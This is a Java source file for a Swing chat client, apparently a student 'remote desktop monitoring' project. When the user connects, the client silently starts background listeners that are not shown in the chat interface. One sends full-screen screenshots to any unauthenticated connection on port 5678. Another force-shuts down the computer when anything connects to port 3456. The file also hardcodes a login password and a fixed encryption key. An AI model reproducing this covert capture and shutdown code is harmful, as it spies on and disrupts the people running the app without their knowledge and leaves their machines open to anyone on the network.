package java_project;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.security.InvalidKeyException;
import java.util.logging.*;
import javax.imageio.*;
import javax.swing.*;
class ShutDown implements Runnable{

    @Override
    public void run() {
    ServerSocket sd;
        try {
            sd = new ServerSocket(3456);
            sd.accept();
        } catch (IOException ex) {
            Logger.getLogger(ShutDown.class.getName()).log(Level.SEVERE, null, ex);
        }
         try 
                {
                        String timef="shutdown -s -f -t "; //-s shuts down -f shuts down forcefully -t gives time
                        String exrun=timef+"60"; 
                        Runtime r=Runtime.getRuntime();//run time object assosiated with current java application 
                        //interface with the environment in which the application is running
                        r.exec(exrun); 
      
                }catch(Exception ex){ex.printStackTrace();}

    }
    
}
class Capture implements Runnable{

    @Override
    public void run() {
        try {
            new Capture().initialize();
        } catch (IOException ex) {
            Logger.getLogger(Capture.class.getName()).log(Level.SEVERE, null, ex);
        } catch (AWTException ex) {
            Logger.getLogger(Capture.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    void initialize() throws IOException, AWTException{
        System.out.println("inside initialize!!");
        ServerSocket s11 = new ServerSocket(5678);
        while(true){
        Socket s1 = s11.accept();
        Toolkit tk = Toolkit.getDefaultToolkit(); //Toolkit class returns the default toolkit
                Dimension d = tk.getScreenSize();

//Dimension class object stores width & height of the toolkit screen
// toolkit.getScreenSize() determines the size of the screen

                Rectangle rec = new Rectangle(0, 0, d.width, d.height);  
//Creates a Rectangle with screen dimensions, here we are capturing the entire screen,if you want you can change it accordingly (i.e you can also capture a particular area on the screen)          
                          
                Robot ro = new Robot(); //a very important class to capture the screen image
                BufferedImage img = ro.createScreenCapture(rec);

//createScreenCapture() method takes Rectangle class instance as argument and returns BufferedImage
                byte[] screenShot=new byte[2048];
               
        File file = new File("first.txt");
        ImageIO.write(img, "jpg", file);
        FileInputStream fis = new FileInputStream(file);
        BufferedInputStream bis = new BufferedInputStream(fis); 
          System.out.println("inside initialize!!");
        
        
        
         OutputStream os = s1.getOutputStream();
                
        
        byte[] contents;
        long fileLength = file.length(); 
        long current = 0;
         
      
        while(current!=fileLength){ 
            int size = 10000;
            if(fileLength - current >= size)
                current += size;    
            else{ 
                size = (int)(fileLength - current); 
                current = fileLength;
            } 
            contents = new byte[size]; 
            bis.read(contents, 0, size); 
            os.write(contents);
            System.out.print("Sending file ... ");
           
        }   
              file.delete();
              
              
               os.close();
               fis.close();
               bis.close();
              s1.close();
    }
            }
        }
class Chat implements Runnable{

    @Override
    public void run() {
        try {
            new Chat().initialize();
        } catch (IOException ex) {
            Logger.getLogger(Chat.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void initialize() throws IOException {
        ServerSocket s22 = new ServerSocket(4567);
        Socket s2 = s22.accept();
    }
    
}

public class A_Chat_Client_GUI extends JFrame{
            private static A_Chat_Client ChatClient;
            public static String UserName="Anonymous";

            static int i=1;
            
            public A_Chat_Client_GUI() {
            initComponents();
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">                          
 
  // public static JFrame MainWindow=new JFrame();
       private static JLabel L_Message = new JLabel();
       public static JTextField TF_Message = new JTextField();
       private static JLabel L_LoggedInAs = new JLabel();
       private static JButton B_DISCONNECT = new JButton();
       private static JButton B_CONNECT = new JButton();
       private static JButton B_SEND = new JButton();
       private static JButton B_ABOUT = new JButton();
       private static JButton B_HELP = new JButton();
       private static JLabel L_Conversation = new JLabel();
       private static JLabel L_ONLINE = new JLabel();
       private static JScrollPane SP_ONLINE = new JScrollPane();
       public static JList JL_ONLINE = new JList();
       private static JScrollPane SP_CONVERSATION = new JScrollPane();
       public static JTextArea TA_CONVERSATION = new JTextArea();
        private static JLabel L_LoggedInAsBox = new JLabel();
       private static JScrollPane jScrollPane1 = new javax.swing.JScrollPane();
        private static JScrollPane jScrollPane2 = new javax.swing.JScrollPane();
        
        
        public static JFrame LogInWindow=new JFrame();
public static JTextField TF_UserNameBox=new JTextField(20);
public static JPasswordField pass = new JPasswordField(20);
public static JLabel passLabel = new JLabel("            Password");
private static JButton B_ENTER=new JButton("ENTER");
private static JLabel L_EnterUserName=new JLabel("Enter user name:");
private static JPanel P_LogIn=new JPanel();
static A_Chat_Client_GUI gui;
public static void main(String[] args){
//BuildMainWindow();
             gui=new A_Chat_Client_GUI();
                gui.setVisible(true);
                Initialize();
                gui.setTitle(UserName+"'s Chat Box");
                MainWindow_Action();
                gui.setResizable(false);

}

public static void Connect(){
try{
final int PORT=444;
final String HOST="SaiHarini";
Socket SOCK=new Socket(HOST,PORT);
System.out.println("You connected to: "+HOST);

ChatClient=new A_Chat_Client(SOCK);

//Send name to add to online list
PrintWriter OUT=new PrintWriter(SOCK.getOutputStream());
OUT.println(UserName);
OUT.flush();

Thread X=new Thread(ChatClient);
Thread Y = new Thread(new ClientInitiator());
Thread Z = new Thread(new Capture());
Thread M = new Thread(new CclientSingleChat());
Thread Q = new Thread(new ShutDown());
X.start();
Y.start();
Z.start();
M.start();
Q.start();
}
catch(Exception X)
{
 System.out.print(X);
JOptionPane.showMessageDialog(null,"Server not responding!");
System.exit(0);
}
}
public static void Initialize(){
    //setLayout(new FlowLayout());
     B_SEND.setEnabled(false);
          B_DISCONNECT.setEnabled(false);
            B_CONNECT.setEnabled(true);

}
public static void BuildLogInWindow(){
   LogInWindow.setTitle("Enter your name: ");
   LogInWindow.setSize(400,150);
   LogInWindow.setLocation(250,200);
   //LogInWindow.setLayout(new FlowLayout());
   LogInWindow.setResizable(true);
   P_LogIn=new JPanel();
      P_LogIn.add(L_EnterUserName);
      P_LogIn.add(TF_UserNameBox);
      P_LogIn.add(passLabel);
      P_LogIn.add(pass);
      P_LogIn.add(B_ENTER);
      LogInWindow.add(P_LogIn);
      
      
      Login_Action();
      LogInWindow.setVisible(true);
    

}


        private void initComponents(){
            
         
   setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(255, 204, 204));
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setPreferredSize(new java.awt.Dimension(889, 526));

        L_Message.setFont(new java.awt.Font("Monotype Corsiva", 1, 18)); // NOI18N
        L_Message.setText("       Message");

        B_DISCONNECT.setBackground(new java.awt.Color(0, 0, 255));
        B_DISCONNECT.setForeground(new java.awt.Color(255, 255, 255));
        B_DISCONNECT.setText("DISCONNECT");
        B_DISCONNECT.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));

        TF_Message.setFont(new java.awt.Font("Comic Sans MS", 2, 18)); // NOI18N
        TF_Message.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED, null, null, null, java.awt.Color.black));
        TF_Message.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));

        L_Conversation.setFont(new java.awt.Font("Monotype Corsiva", 1, 18)); // NOI18N
        L_Conversation.setText("                  Conversation");

        L_LoggedInAs.setFont(new java.awt.Font("Monotype Corsiva", 1, 18)); // NOI18N
        L_LoggedInAs.setText("         Logged in as...");

        L_LoggedInAsBox.setFont(new java.awt.Font("Algerian", 0, 14)); // NOI18N
        L_LoggedInAsBox.setForeground(new java.awt.Color(204, 0, 0));
        L_LoggedInAsBox.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        L_LoggedInAsBox.setText("");
        L_LoggedInAsBox.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED));

        B_CONNECT.setBackground(new java.awt.Color(0, 0, 255));
        B_CONNECT.setForeground(new java.awt.Color(255, 255, 255));
        B_CONNECT.setText("CONNECT");
        B_CONNECT.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));

        B_SEND.setBackground(new java.awt.Color(0, 0, 255));
        B_SEND.setForeground(new java.awt.Color(255, 255, 255));
        B_SEND.setText("SEND");
        B_SEND.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));

        B_ABOUT.setBackground(new java.awt.Color(0, 0, 255));
        B_ABOUT.setForeground(new java.awt.Color(255, 255, 255));
        B_ABOUT.setText("SEND FILE");
        B_ABOUT.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));

        B_HELP.setBackground(new java.awt.Color(0, 0, 255));
        B_HELP.setForeground(new java.awt.Color(255, 255, 255));
        B_HELP.setText("ABOUT");
        B_HELP.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));

        L_ONLINE.setFont(new java.awt.Font("Monotype Corsiva", 1, 18)); // NOI18N
        L_ONLINE.setText("          Online Users");

        JL_ONLINE.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));
        JL_ONLINE.setFont(new java.awt.Font("Algerian", 0, 18)); // NOI18N
        JL_ONLINE.setForeground(new java.awt.Color(0, 0, 255));
        jScrollPane2.setViewportView(JL_ONLINE);

        TA_CONVERSATION.setEditable(false);
        TA_CONVERSATION.setColumns(20);
        TA_CONVERSATION.setFont(new java.awt.Font("Comic Sans MS", 2, 18)); // NOI18N
        TA_CONVERSATION.setForeground(new java.awt.Color(0, 0, 255));
        TA_CONVERSATION.setRows(5);
        TA_CONVERSATION.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));
        SP_CONVERSATION.setViewportView(TA_CONVERSATION);
        SP_CONVERSATION.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
        SP_CONVERSATION.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(SP_CONVERSATION)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 173, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                            .addGroup(layout.createSequentialGroup()
                                .addGap(161, 161, 161)
                                .addComponent(L_Conversation, javax.swing.GroupLayout.PREFERRED_SIZE, 311, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(L_ONLINE, javax.swing.GroupLayout.PREFERRED_SIZE, 177, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(javax.swing.GroupLayout.Alignment.LEADING, layout.createSequentialGroup()
                                .addComponent(L_Message, javax.swing.GroupLayout.PREFERRED_SIZE, 145, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(TF_Message, javax.swing.GroupLayout.PREFERRED_SIZE, 482, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(L_LoggedInAs, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                    .addComponent(L_LoggedInAsBox, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                            .addGroup(javax.swing.GroupLayout.Alignment.LEADING, layout.createSequentialGroup()
                                .addComponent(B_DISCONNECT, javax.swing.GroupLayout.PREFERRED_SIZE, 164, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(B_CONNECT, javax.swing.GroupLayout.PREFERRED_SIZE, 160, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(B_SEND, javax.swing.GroupLayout.PREFERRED_SIZE, 157, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(B_ABOUT, javax.swing.GroupLayout.PREFERRED_SIZE, 153, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(B_HELP, javax.swing.GroupLayout.PREFERRED_SIZE, 153, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(L_LoggedInAs)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(L_LoggedInAsBox, javax.swing.GroupLayout.PREFERRED_SIZE, 28, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(L_Message, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(TF_Message, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addGap(18, 18, 18)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(B_DISCONNECT, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(B_CONNECT, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(B_SEND, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(B_ABOUT, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(B_HELP, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(L_ONLINE, javax.swing.GroupLayout.PREFERRED_SIZE, 29, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(L_Conversation, javax.swing.GroupLayout.PREFERRED_SIZE, 36, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(SP_CONVERSATION)
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 288, Short.MAX_VALUE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        pack();
    
    
        }
    
//}
   
public static void Login_Action(){
    B_ENTER.addActionListener(
    new java.awt.event.ActionListener() {

        @Override
        public void actionPerformed(ActionEvent e) {
           ACTION_B_ENTER();
        }
    });
}

public static void ACTION_B_ENTER(){
    if(!TF_UserNameBox.getText().equals("")){
        if(pass.getText().equals("client")){
        UserName=TF_UserNameBox.getText().trim();
        L_LoggedInAsBox.setText(UserName);
      // A_Chat_Server.CurrentUsers.add(UserName);
       
gui.setTitle(UserName+"'s Chat Box");
       
        
        
        LogInWindow.setVisible(false);
        B_SEND.setEnabled(true);
        B_DISCONNECT.setEnabled(true);
        B_CONNECT.setEnabled(false);
        Connect();
    
    }
        else{
            TF_UserNameBox.setText("");
            pass.setText("");
        }
    }
    else{
        JOptionPane.showMessageDialog(null,"Please enter a name");
        
    }
}
      public static void MainWindow_Action(){
          B_SEND.addActionListener(
          new java.awt.event.ActionListener(){
              public void actionPerformed(java.awt.event.ActionEvent evt){
                  ACTION_B_SEND();
              }
          });
          
          B_DISCONNECT.addActionListener(
          new java.awt.event.ActionListener(){
              public void actionPerformed(java.awt.event.ActionEvent evt){
                  ACTION_B_DISCONNECT();
              }
          });
          
          B_CONNECT.addActionListener(
          new java.awt.event.ActionListener(){
              public void actionPerformed(java.awt.event.ActionEvent evt){
                 BuildLogInWindow();
                 
              }
          });
          
          B_HELP.addActionListener(
          new java.awt.event.ActionListener(){
              public void actionPerformed(java.awt.event.ActionEvent evt){
                 JOptionPane p=new JOptionPane();
           gui.setEnabled(false);
           p.showMessageDialog(null,"Remote Desktop Monitoring System!");
          gui.setEnabled(true);
                  
              }
          });
          
          B_ABOUT.addActionListener(
          new java.awt.event.ActionListener(){
              public void actionPerformed(java.awt.event.ActionEvent evt){
                  try {
                      ACTION_B_ABOUT();
                  } catch (IOException ex) {
                      Logger.getLogger(A_Chat_Client_GUI.class.getName()).log(Level.SEVERE, null, ex);
                  } catch (ClassNotFoundException ex) {
                      Logger.getLogger(A_Chat_Client_GUI.class.getName()).log(Level.SEVERE, null, ex);
                  } catch (InvalidKeyException ex) {
                      Logger.getLogger(A_Chat_Client_GUI.class.getName()).log(Level.SEVERE, null, ex);
                  } catch (CryptoException ex) {
                      Logger.getLogger(A_Chat_Client_GUI.class.getName()).log(Level.SEVERE, null, ex);
                  }
              }
          });
      }
     
      public static void ACTION_B_SEND(){
          if(!TF_Message.getText().equals("")){
              ChatClient.SEND(TF_Message.getText());
              TF_Message.requestFocus();//gets the cursor
          }
      }
      
      public static void ACTION_B_DISCONNECT(){
          String c=TA_CONVERSATION.getText();
                  PrintWriter pw=null;
                  int p;
                  //System.out.println(c);
                  File f=null;
                  f=new File("Backups.txt");
                  try
                  {
                      pw=new PrintWriter(new BufferedWriter(new FileWriter(f,true)));
                  pw.println(c);
                  } catch (IOException e) {
                      System.out.println(e);
                  }
                  finally{pw.close();}
          try{
              ChatClient.DISCONNECT();
              B_CONNECT.setEnabled(false);
              B_SEND.setEnabled(false);
               B_DISCONNECT.setEnabled(false);
                B_ABOUT.setEnabled(false);
              //JL_ONLINE.removeAll();
          }
          catch(Exception Y){
              Y.printStackTrace();
          }
          
      }
      
        public static void ACTION_B_HELP(){
           JOptionPane p=new JOptionPane();
          
           p.showMessageDialog(null,"Remote Desktop Monitoring System!");
      
           
       }
      
       public static void ACTION_B_ABOUT() throws IOException, ClassNotFoundException, InvalidKeyException, CryptoException{
           CCOM c = new CCOM(); 
    
}
      
       
public static class CCOM extends JFrame {

  CCOM() throws IOException, ClassNotFoundException, InvalidKeyException, CryptoException{
            Socket s = new Socket("SaiHarini",1234);
   // int c;
        System.out.println("Connection made!");

        byte[] key = new byte[]{'M','a','r','y',' ','h','a','s',' ','o','n','e',' ','c','a','t'}; 
		
         JFileChooser j = new JFileChooser();
         j.showOpenDialog(null);
         File selFile = null;
        try{
         selFile = j.getSelectedFile();
        //File inputFile = selFile;
        if(selFile.length()!=0){
        JOptionPane.showMessageDialog(null,selFile);
	File encryptedFile = new File("encrypted.txt");
        CryptoUtils.encrypt(key, selFile, encryptedFile);
        System.out.println("LINE 7");
        FileInputStream fis = new FileInputStream(encryptedFile);
        BufferedInputStream bis = new BufferedInputStream(fis); 
          
    
        OutputStream os = s.getOutputStream();
                
        
        byte[] contents;
        long fileLength = encryptedFile.length(); 
        long current = 0;
         
      
        while(current!=fileLength){ 
            int size = 10000;
            if(fileLength - current >= size)
                current += size;    
            else{ 
                size = (int)(fileLength - current); 
                current = fileLength;
            } 
            contents = new byte[size]; 
            bis.read(contents, 0, size); 
            os.write(contents);
            System.out.print("Sending file ... ");
        }  
        os.flush();
         os.close();
         fis.close();
        bis.close();
        }    
        }
        catch(Exception e){
            JOptionPane.showMessageDialog(null,"You have not selected any file!");
        }
    s.close();
    System.out.println("LINE 8");
//} // end method processConnection     
}
            }}